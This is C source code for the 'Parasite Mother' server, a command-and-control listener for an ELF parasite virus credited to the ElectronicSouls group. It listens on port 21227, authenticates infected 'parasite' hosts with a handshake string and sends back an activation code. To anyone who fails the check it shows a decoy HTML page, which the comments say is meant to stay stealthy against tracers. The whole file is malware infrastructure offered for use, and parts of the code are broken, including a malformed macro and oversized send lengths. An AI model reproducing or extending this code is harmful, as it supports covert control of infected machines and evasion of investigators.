/*
   Invader ELF Parasite MotherShip 
   (C) BrainStorm - ElectronicSouls

   quick greetz: SectorX,ghQst,RobBbot,it_Fresh,FreQ,x23
                 and all other ElectronicSouls Members !
 */

#include <stdio.h>          
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


#define PORT 21227           /* Port that will be opened */ 
#define BACKLOG 200          /* Number of allowed connections */
#define HANDSHAKE -0x53-     /* sequence to be sent back */

main()
{
  int fd, 
     fd2, 
     bof; 
 
  struct sockaddr_in server; /* server's address information */
  struct sockaddr_in client; /* client's address information */
   
  char *tempkey = (char *)malloc(sizeof(char) * 100); /* the handshake data*/
  int sin_size;

  printf("\n\n[ .oOo (( Parasite Mother Server )) oOo. ]\n");
  printf("  CONFIDENTIAL ELECTRONICSOULS SOFTWARE!     \n");
  printf("           DO NOT DISTRIBUTE !           \n\n"); 

  if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 )
  {  
    printf("socket() error\n");
    exit(-1);
  }
  printf(" [*] starting parasite mother...\n");
  server.sin_family = AF_INET;         
  server.sin_port = htons(PORT);         /* the PORT we are listening on                  */
  server.sin_addr.s_addr = INADDR_ANY;   /* INADDR_ANY puts your IP address automatically */   
  bzero(&(server.sin_zero),8);           /* zero the rest of the structure                */
  printf(" [!] Mother activated !\n\n");
  printf(" [*] waiting for incoming connections... \n");
  if(bind(fd,(struct sockaddr*)&server,sizeof(struct sockaddr))==-1)
  {                                     
      printf(" [x] bind() error\n");       
      exit(-1);
  }     

  if(listen(fd,BACKLOG) == -1)
  {  
      printf(" [x] listen() error\n"); 
      exit(-1);
  }

while(1)
  {
  sin_size=sizeof(struct sockaddr_in);

  if ((fd2 = accept(fd,(struct sockaddr *)&client,&sin_size))==-1)
  { 
  printf(" [x] accept() error\n");
  exit(-1);
  }
  
  printf(" [!] Parasite connecting from %s !\n",inet_ntoa(client.sin_addr) ); /* prints client's IP */
  printf(" [-] Waiting for Handshake ... \n");
 
  recv(fd2,tempkey,15,0);                   /* testing handshake if its valid.. */
  if (strstr(tempkey, "-0x45-") != NULL)
  {
      printf(" [*] Parasite Authenticated ! \n\n");   /* authenticated! */
	  send(fd2,"-0x53-",14,0);                      /* send activation sequence back to client */
      printf(" [*] Sent activation code back to Parasite host... \n");
  }
  else 
  {
      
      printf("       *** WARNING! AUTHENTICATION FAILED! *** \n");
      printf("   %s probably trys to trace us ;/ !\n",inet_ntoa(client.sin_addr) );
      send(fd2,"\n\n <html><title>UNAUTHORIZED-ACCESS!</title><body><H1> *** Your Connection has been Logged ! *** </H1></body></html> \n\n",500,0);          /* send to the client a message */  
      /* we let it look like html output to be a little bit more *stealth* */
  }
  printf(" ---------------------------------------------------------- \n\n");
 close(fd2); 
 }
}

